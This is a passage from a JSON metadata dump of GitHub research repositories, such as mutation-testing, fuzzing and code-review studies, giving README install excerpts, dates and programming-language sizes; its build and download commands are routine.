                    "value": "```shell script\n# run from root directory\n\n# llvm installation on Mac:\nbrew install llvm@11\n\n# llvm installation on linux:\necho deb http://apt.llvm.org/focal/ llvm-toolchain-focal-11 main >> /etc/apt/sources.list && \\\n    wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | apt-key add -\n\napt-get update && apt-get upgrade -y\n\napt-get install -y gcc-10 g++-10 gcc-10-plugin-dev gcc-10-multilib \\\n    libc++-10-dev gdb lcov\n\napt-get install -y clang-11 clang-tools-11 libc++1-11 libc++-11-dev \\\n    libc++abi1-11 libc++abi-11-dev libclang1-11 libclang-11-dev \\\n    libclang-common-11-dev libclang-cpp11 libclang-cpp11-dev liblld-11 \\\n    liblld-11-dev liblldb-11 liblldb-11-dev libllvm11 libomp-11-dev \\\n    libomp5-11 lld-11 lldb-11 llvm-11 llvm-11-dev llvm-11-runtime llvm-11-tools\n\nupdate-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-10 0\nupdate-alternatives --install /usr/bin/g++ g++ /usr/bin/g++-10 0\n\nrm -rf /var/cache/apt/archives/*\n\nln /bin/clang-11 /bin/clang\nln /bin/clang++-11 /bin/clang++\nln /bin/opt-11 /bin/opt\nln /bin/llvm-config-11 /bin/llvm-config\nln /bin/llvm-ar-11 /bin/llvm-ar\n\n\n\n# compiles the project and installs it under build/install\nexport LD_LIBRARY_PATH=${mutation_tool_home}/build/install/LLVM_Mutation_Tool/lib/\ngradle build\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Local Install (only recommended for local development!)",
                    "parent_header": [
                        "Extending the Tool",
                        "Install"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/CISPA-SysSec/mua_fuzzer_bench/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- **Dockerfile**: The docker build command is run from the project root dir.\n    This Dockerfile is used to compile the fuzzer and copy the following two\n    files into the created image. The image will be used to create the\n    containers used for fuzzing.\n- **eval.sh**: Run inside the docker container for coverage fuzzing and\n    evaluating on mutants. This script builds the instrumented binary and\n    executes the fuzzing run. Arguments are path to the bitcode file in the\n    docker container, compile arguments, and path to the seed corpus directory.\n    Additionally, environment variables are passed: `DICT_PATH` contains the\n    path to the dictionary for the program if available. Also `MUT_WITH_ASAN`\n    or `MUT_WITH_MSAN` have the value `\"1\"` if ASan or MSan should be used.\n- **minimize.sh**: Similar to `eval.sh` this script is run inside the docker\n    container to use the fuzzers minimization algorithm. Arguments are: the path\n    to the bitcode file, compile arguments, path to the directory containing the\n    inputs that should be minimized, and the path to the output directory.\n- **config.json**: Additional information about the fuzzer used to decide which\n    queue inputs and crash inputs the fuzzer generates and should be used during evaluation.\n \n",
                    "original_header": "Adding New Fuzzers"
                },
                "confidence": 0.9999880816163498,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/CISPA-SysSec/mua_fuzzer_bench/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```shell script\n# run in root directory to delete all build products\n# can also be used if the build does not correctly update or another strange behavior is observed\n\ngradle clean\n```\n```shell script\n# run in root directory to delete all generated mutation files in samples\n\nsh clean_mutations_in_samples.sh\n```\n \n",
                    "original_header": "Clean"
                },
                "confidence": 0.9999992265812103,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/CISPA-SysSec/mua_fuzzer_bench/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-06-15T11:50:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-06T08:58:51Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 338666
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 167291
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 18475
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 11078
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 9352
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 3406
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2664
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "849": {
        "filename": "atrautsch_nlbse2022_replication_kit_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/atrautsch/nlbse2022_replication_kit",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```bash\npython3.8 -m venv .\nsource bin/activate\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Create venv and install dependencies",
                    "parent_header": [
                        "Predicting Issue Types with seBERT"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/atrautsch/nlbse2022_replication_kit/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\ncd data\nwget https://tickettagger.blob.core.windows.net/datasets/github-labels-top3-803k-test.tar.gz\nwget https://tickettagger.blob.core.windows.net/datasets/github-labels-top3-803k-train.tar.gz\ngunzip github-labels-top3-803k-test.tar.gz\ngunzip github-labels-top3-803k-train.tar.gz\n```\n \n",
                    "original_header": "Load provided data"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/atrautsch/nlbse2022_replication_kit/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```bash\ncd models\nwget https://smartshark2.informatik.uni-goettingen.de/sebert/seBERT_pre_trained.tar.gz\ntar -xzf seBERT_pre_trained.tar.gz\n```\n \n",
                    "original_header": "Loading the pre-trained model"
                },
                "confidence": 0.999999977186292,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/atrautsch/nlbse2022_replication_kit/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We provide the fine-tuned version of the model that we used [here](https://smartshark2.informatik.uni-goettingen.de/sebert/nlbse.tar.gz).\n```bash\ncd models\nwget https://smartshark2.informatik.uni-goettingen.de/sebert/nlbse.tar.gz\ntar -xzf nlbse.tar.gz\nmv model nlbse\n```\n \n",
                    "original_header": "Loading the fine-tuned model"
                },
                "confidence": 0.9999911602348188,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/atrautsch/nlbse2022_replication_kit/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-02-17T12:59:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-03-07T07:53:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 23385
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "850": {
        "filename": "xdevroey_jhipster-dataset_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/xdevroey/jhipster-dataset",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2017-10-11T13:45:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-06-10T00:06:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 9425
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 3294
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "851": {
        "filename": "XLipcak_rev-rec_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/XLipcak/rev-rec",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "> Lipcak, J., Rossi, B. (2018) A Large-Scale Study on Source Code Reviewer Recommendation, in 44th Euromicro Conference on Software Engineering and Advanced Applications (SEAA) 2018, IEEE.\n",
                    "type": "Text_excerpt",
                    "original_header": "If you use the provided source code and data set, please cite:",
                    "parent_header": [
                        "A Large-Scale Study on Source Code Reviewer Recommendation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/XLipcak/rev-rec/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-10-24T17:17:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-25T07:59:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 125579
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 2580
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 1148
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "852": {
        "filename": "Tovy97_Towards-Substructural-Property-Based-Testing_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Tovy97/Towards-Substructural-Property-Based-Testing",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-06-06T12:36:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-05-08T08:05:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Prolog",
                    "name": "Prolog",
                    "type": "Programming_language",
                    "size": 214529
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "LLVM",
                    "name": "LLVM",
                    "type": "Programming_language",
                    "size": 46667
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 11776
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "853": {
        "filename": "teiresias-personal-data-discovery_teiresias-system_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/teiresias-personal-data-discovery/teiresias-system",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- <a href=\"https://github.com/teiresias-personal-data-discovery/teiresias-system/blob/210ab7e60a93b9a0cc675f84be6e4ce25640ed99/docs/deployment.md#deployment\">Deployment</a> \n- <a href=\"https://github.com/teiresias-personal-data-discovery/teiresias-system/blob/main/docs/troubleshooting.md#troubleshooting\n\">Troubleshooting</a>\n \n",
                    "original_header": "Discovery and Inventory of Personal Data in Distributed Systems Environments"
                },
                "confidence": 0.9993860516361635,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/teiresias-personal-data-discovery/teiresias-system/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\n.\n\u251c\u2500\u2500 LICENSE . . . . . . . . . . . . . . . . . .   MIT license\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 airflow . . . . . . . . . . . . . . . . . .   Workflow management platform\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 dags                                          \u25b6 Workflows/DAGs\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 logs                                          \u25b6 Logs\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 plugins\n\u2502\u00a0\u00a0 \u2502\u00a0\u00a0 \u2514\u2500\u2500 operators                                 \u25b6 Custom Operators\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 repositories                                  \u25b6 Directory for code Analysis \n\u2502\u00a0\u00a0     \u2514\u2500\u2500 paste_analyzable_code_here                  \u25b6 watched directory \n\u251c\u2500\u2500 certs . . . . . . . . . . . . . . . . . . .   Directory for cert.pem, key.pem\n\u251c\u2500\u2500 docker-compose.yaml     \n\u251c\u2500\u2500 interfaces  . . . . . . . . . . . . . . . .   Inventory GUI & Extension Interface\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 server                                        \u25b6 NGINX config\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 src                                           \u25b6 React source code\n\u251c\u2500\u2500 inventory-api . . . . . . . . . . . . . . .   Inventory API\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 src                                           \u25b6 NestJS source code\n\u251c\u2500\u2500 inventory-db  . . . . . . . . . . . . . . .   Inventory DB (MongoDB) config\n\u2514\u2500\u2500 reverse-proxy . . . . . . . . . . . . . . .   Reverse proxy (Traefik) config\n```\n \n",
                    "original_header": "Project Map"
                },
                "confidence": 0.9999996846427095,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/teiresias-personal-data-discovery/teiresias-system/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-08-09T11:54:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-27T03:27:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 99580
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 80740
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 6965
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1402
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 962
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 883
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 439
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "854": {
        "filename": "FlowSs_RLMutation_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/FlowSs/RLMutation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "07/02/2023: Error in the 'no_discount_factor' mutation applied to DQN: it should be `(1 - replay_data.dones)` and not `(replay_data.dones)`. Updated the code as well as provided trained agents with the correct mutation in `results/corrected_NDF_DQN/`.\n\nWhen testing on the initial environment, the following results were obtained with the new agents:\n\n```\nEnvironement: CartPole-v1, Model dqn, Mutation NDF\nAverage Mutated/Healthy Ratio Test : 0.55\nReward Distribution Test : Killed\nDistance Distribution Test: Killed\n```\n\n```\nEnvironement: LunarLander-v2, Model dqn, Mutation NDF\nAverage Mutated/Healthy Ratio Test : 0.95\nReward Distribution Test : Killed\nDistance Distribution Test: Killed\n```\n\ni.e. only a change on the AVG method when the environment is CartPole-v1 (from 1.0 to 0.55), rest is unchanged.\n",
                    "type": "Text_excerpt",
                    "original_header": "Hot Fixes",
                    "parent_header": [
                        "Mutation Testing for Deep Reinforcement Learning"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FlowSs/RLMutation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you wish to retrain the agents as we did, you can run the following script:\n```bash\npython train.py -a [algorithm] -na [number_of_agents] -e [environment] -t [total_steps] -s [start_from] -m [mutation] \n``` \nFor instance:\n```bash\npython train.py -a ppo -na 20 -e CartPole-v1 -t 200000 -s 0 -m '{\"no_reverse\": \"None\"}' \n``` \n",
                    "original_header": "Training of agents"
                },
                "confidence": 0.9941636592998463,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/FlowSs/RLMutation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The next step is to evaluate the agents on the environment and to get their reward. This can\nbe done with the following scripts:\n```bash\npython test_agent.py -a [algorithm] -na [number_of_agents] -e [environment] -m [mutation] \n``` \n",
                    "original_header": "Evaluating agents"
                },
                "confidence": 0.9967068342874938,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/FlowSs/RLMutation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Thus,\n```bash\npython eval_mut.py -a ppo -e CartPole-v1 -m NR\n``` \n",
                    "original_header": "Mutation test on the initial environment"
                },
                "confidence": 0.96310266498796,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/FlowSs/RLMutation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To search for the boundary test environments as well as to evaluate said test environments on\nthe FOM, the following script should be run:\n```bash\npython algo.py -a [algorithm] -e [environment] -i [init_val] -l [limits] -b [bounds] -t [test_mode] -n [number_of_cpus]\n``` \n",
                    "original_header": "Generating test environments"
                },
                "confidence": 0.9978940482423809,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/FlowSs/RLMutation/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Models trained need to have the `logs/` directory set in the correct sub-directory. Once again, if you uncompress\nthe `.zip` from Zenodo, everything will be set accordingly. \nFinally, the following script should be run:\n```bash\npython hom_prop.py -a [algorithm] -e [environment] -t [test_mode] -n [number_of_cpus]\n``` \n",
                    "original_header": "Evaluating Higher Order Mutation properties"
                },
                "confidence": 0.9991564584740544,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/FlowSs/RLMutation/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-12T23:13:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-17T18:45:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 166693
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 621
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "855": {
        "filename": "tehwalris_forest_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tehwalris/forest",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-04-04T14:41:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-07T11:50:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TypeScript",
                    "name": "TypeScript",
                    "type": "Programming_language",
                    "size": 421786
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 9225
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 689
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 531
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Nix",
                    "name": "Nix",
                    "type": "Programming_language",
                    "size": 309
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 168
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "856": {
        "filename": "zhongxingyu_Java-Annotation-Study_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/zhongxingyu/Java-Annotation-Study",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-08-21T02:10:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-08-14T15:58:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 167392
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 105910
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "857": {
        "filename": "ypyixiuxiu_TDMdatasets_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ypyixiuxiu/TDMdatasets",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-11-30T15:40:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-12-11T01:31:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "858": {
        "filename": "EngineeringSoftware_jattack_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/EngineeringSoftware/jattack",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```bash\ncd tool\n./install.sh\n```\n\nThe `install.sh` script builds JAttack jar, installs python packages\nand creates an executable `jattack` in `tools`.\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "JAttack"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/jattack/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The following steps build javadoc for JAttack jar. Please refer to\nclass `Boom` for how to use provided APIs to write your own template. \n1. Build javadoc from source code.\n   ```bash\n   cd tool/api\n   ./gradlew javadoc\n   ``` \n",
                    "original_header": "Docs"
                },
                "confidence": 0.9863999571989206,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/jattack/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you find JIT bugs using JAttack, we would be happy to add your\nfindings to this list. Please open a PR with a link to your bug. \n",
                    "original_header": "Hall of Fame"
                },
                "confidence": 0.98978119705901,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/jattack/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-25T18:26:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-04T18:47:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 682846
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 14481
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1848
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "859": {
        "filename": "lin-tan_CURE_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lin-tan/CURE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-08-27T20:44:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-28T02:34:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 137079
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 24634
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "860": {
        "filename": "shailja-thakur_VGen_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/shailja-thakur/VGen",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Training details can be accessed here: https://github.com/shailja-thakur/CodeGen-Fine-Tuning \n",
                    "original_header": "Training and Fine-tuning"
                },
                "confidence": 0.9718998895470603,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shailja-thakur/VGen/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The models and the Verilog code corpus are available on the [HuggingFace Hub](https://huggingface.co/models?search=verilog) with a Jupyter notebook [here](https://github.com/shailja-thakur/benchmarking-LLM-Verilog/blob/main/VGen_Demo_notebook.ipynb) and a Colab demo [here](https://colab.research.google.com/drive/XYZ?usp=sharing). \n",
                    "original_header": "Sampling with HuggingFace"
                },
                "confidence": 0.9076211982239852,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shailja-thakur/VGen/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-09-18T17:35:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-28T10:01:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 263213
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Verilog",
                    "name": "Verilog",
                    "type": "Programming_language",
                    "size": 72218
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 6684
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "861": {
        "filename": "sraedler_Model-Driven-Engineering4Artificial-Intelligence_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sraedler/Model-Driven-Engineering4Artificial-Intelligence",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-01-24T11:52:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-09T09:42:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 2077085
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "862": {
        "filename": "yueyueL_DL-based-Android-Malware-Defenses-review_2024-10-03.json",
        "code_repository": [
            {
